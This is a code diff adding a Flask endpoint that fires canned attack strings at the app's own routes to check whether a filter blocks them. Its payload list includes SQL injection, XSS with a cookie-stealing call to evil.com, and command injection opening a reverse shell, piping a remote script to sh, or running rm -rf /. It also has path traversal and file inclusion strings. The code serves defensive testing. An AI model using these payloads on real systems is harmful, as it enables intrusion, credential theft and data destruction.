@@ -660,6 +660,137 @@ def attack_generator_status():
         "interval": attack_gen.interval
     })
 
+# Attack Tools Page and API
+@app.route('/attack-tools')
+def attack_tools():
+    """Manual attack generator page"""
+    if "user_id" not in session:
+        flash("Please log in to continue", "warning")
+        return redirect(url_for('login'))
+    return render_template('attack_tools.html')
+
+@app.route('/api/attack-tools/generate', methods=['POST'])
+def api_generate_attacks():
+    """Generate manual attacks for testing"""
+    if "user_id" not in session:
+        return jsonify({"error": "Unauthorized"}), 401
+
+    data = request.get_json()
+    count = data.get('count', 75)
+    attack_types = data.get('types', ['sql', 'xss', 'cmd', 'traversal', 'file_inclusion'])
+
+    # Attack patterns by type
+    attack_patterns = {
+        'sql': [
+            ("username=' OR '1'='1", "/login"),
+            ("id=1' UNION SELECT * FROM users--", "/api/logs"),
+            ("search=' OR 1=1--", "/search"),
+            ("user=admin'--", "/admin"),
+            ("query=1'; DROP TABLE users;--", "/query"),
+            ("id=' UNION ALL SELECT NULL,NULL,NULL--", "/data"),
+            ("filter=1' AND SLEEP(5)--", "/filter"),
+            ("sort=' OR 'x'='x", "/sort"),
+            ("page=1' UNION SELECT table_name FROM information_schema.tables--", "/page"),
+            ("param=admin' OR '1'='1'#", "/param"),
+        ],
+        'xss': [
+            ("comment=<script>alert('XSS')</script>", "/comment"),
+            ("name=<img src=x onerror=alert(1)>", "/profile"),
+            ("message=<svg onload=alert(document.cookie)>", "/message"),
+            ("bio=<iframe src=javascript:alert(1)>", "/bio"),
+            ("title=<body onload=alert('XSS')>", "/post"),
+            ("content=<input onfocus=alert(1) autofocus>", "/content"),
+            ("desc=<script>fetch('http://evil.com?c='+document.cookie)</script>", "/desc"),
+            ("text=<a href=\"javascript:alert(1)\">Click</a>", "/text"),
+            ("data=<embed src=\"javascript:alert(1)\">", "/data"),
+            ("value=<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">", "/value"),
+        ],
+        'cmd': [
+            ("cmd=; cat /etc/passwd", "/exec"),
+            ("file=| ls -la", "/file"),
+            ("run=&& whoami", "/run"),
+            ("exec=`id`", "/execute"),
+            ("script=$(cat /etc/shadow)", "/script"),
+            ("command=; nc -e /bin/sh attacker.com 4444", "/command"),
+            ("process=| curl http://evil.com/backdoor.sh | sh", "/process"),
+            ("input=&& wget http://malware.com/payload", "/input"),
+            ("action=`rm -rf /`", "/action"),
+            ("task=|| chmod 777 /etc/passwd", "/task"),
+        ],
+        'traversal': [
+            ("file=../../../../etc/passwd", "/download"),
+            ("path=../../../windows/system32/config/sam", "/view"),
+            ("doc=....//....//....//etc/shadow", "/read"),
+            ("resource=..\\..\\..\\boot.ini", "/get"),
+            ("page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "/page"),
+            ("template=../../../../../../etc/hosts", "/include"),
+            ("file=../config/database.yml", "/load"),
+            ("document=/var/www/../../etc/passwd", "/show"),
+            ("content=/var/www/../../etc/shadow", "/content"),
+            ("resource=file:///etc/passwd", "/fetch"),
+        ],
+        'file_inclusion': [
+            ("page=php://filter/convert.base64-encode/resource=index.php", "/index"),
+            ("file=php://input", "/include"),
+            ("page=expect://id", "/page"),
+            ("template=data://text/plain,<?php phpinfo();?>", "/template"),
+            ("include=http://evil.com/shell.txt", "/include"),
+            ("file=/proc/self/environ", "/file"),
+            ("page=zip://shell.zip#shell.php", "/page"),
+            ("resource=phar://shell.phar/shell.php", "/resource"),
+            ("template=php://filter/read=string.rot13/resource=config.php", "/template"),
+            ("file=file:///etc/passwd", "/file"),
+        ],
+    }
+
+    results = []
+    import random
+
+    # Generate attacks
+    for i in range(count):
+        attack_type = random.choice(attack_types)
+        if attack_type not in attack_patterns:
+            continue
+
+        payload, endpoint = random.choice(attack_patterns[attack_type])
+
+        # Send the attack
+        try:
+            # Make internal request
+            with app.test_client() as client:
+                # Set session for authenticated request
+                with client.session_transaction() as sess:
+                    sess['user_id'] = session.get('user_id')
+                    sess['username'] = session.get('username')
+
+                # Send GET request with malicious payload
+                response = client.get(f"{endpoint}?{payload}")
+
+                results.append({
+                    'type': attack_type,
+                    'endpoint': endpoint,
+                    'payload': payload,
+                    'status': response.status_code,
+                    'blocked': response.status_code == 403
+                })
+        except Exception as e:
+            results.append({
+                'type': attack_type,
+                'endpoint': endpoint,
+                'payload': payload,
+                'status': 500,
+                'blocked': False,
+                'error': str(e)
+            })
+
+    return jsonify({
+        "success": True,
+        "results": results,
+        "total": len(results),
+        "blocked": sum(1 for r in results if r['blocked']),
+        "passed": sum(1 for r in results if not r['blocked'])
+    })
+
 if __name__ == '__main__':
     # Start attack generator in background
     print("\n" + "="*70)
